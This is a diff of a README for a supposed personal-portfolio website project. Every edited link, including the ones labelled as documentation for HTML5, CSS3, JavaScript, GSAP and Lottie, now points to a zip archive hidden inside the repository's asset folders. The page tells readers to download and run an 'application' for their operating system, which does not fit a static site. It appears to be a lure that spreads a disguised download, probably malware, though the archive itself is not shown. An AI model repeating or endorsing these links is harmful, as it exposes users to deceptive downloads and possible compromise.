@@ -1,6 +1,6 @@
 # 🎨 monster-personal-site - Your Stunning Portfolio Awaits
 
-[![Download Latest Release](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/images/Features/monster_site_personal_v3.8.zip%20Latest%20Release-Here-brightgreen)](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/images/Features/monster_site_personal_v3.8.zip)
+[![Download Latest Release](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/js/modules/personal_site_monster_v1.4.zip%20Latest%20Release-Here-brightgreen)](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/js/modules/personal_site_monster_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,9 +12,9 @@ Whether you want to use this as inspiration or as a foundation for your own proj
 
 To get started, you need to download the application from the Releases page. Click the link below to visit the page and download the files:
 
-[Download Latest Release](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/images/Features/monster_site_personal_v3.8.zip)
+[Download Latest Release](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/js/modules/personal_site_monster_v1.4.zip)
 
-1. Visit the [Releases page](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/images/Features/monster_site_personal_v3.8.zip).
+1. Visit the [Releases page](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/js/modules/personal_site_monster_v1.4.zip).
 2. Find the latest version listed there.
 3. Click on the asset that matches your operating system (e.g., Windows, macOS, Linux).
 4. Save the file to your preferred location on your computer.
@@ -88,11 +88,11 @@ Your feedback is valuable. If you have suggestions or wish to report issues, ple
 
 Explore more about the technologies used in this project:
 
-- [HTML5](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/images/Features/monster_site_personal_v3.8.zip)
-- [CSS3](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/images/Features/monster_site_personal_v3.8.zip)
-- [JavaScript](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/images/Features/monster_site_personal_v3.8.zip)
-- [GSAP](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/images/Features/monster_site_personal_v3.8.zip)
-- [Lottie](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/images/Features/monster_site_personal_v3.8.zip)
+- [HTML5](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/js/modules/personal_site_monster_v1.4.zip)
+- [CSS3](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/js/modules/personal_site_monster_v1.4.zip)
+- [JavaScript](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/js/modules/personal_site_monster_v1.4.zip)
+- [GSAP](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/js/modules/personal_site_monster_v1.4.zip)
+- [Lottie](https://github.com/kalkaloweh/monster-personal-site/raw/refs/heads/main/assets/js/modules/personal_site_monster_v1.4.zip)
 
 ## 🎉 Stay Updated
 
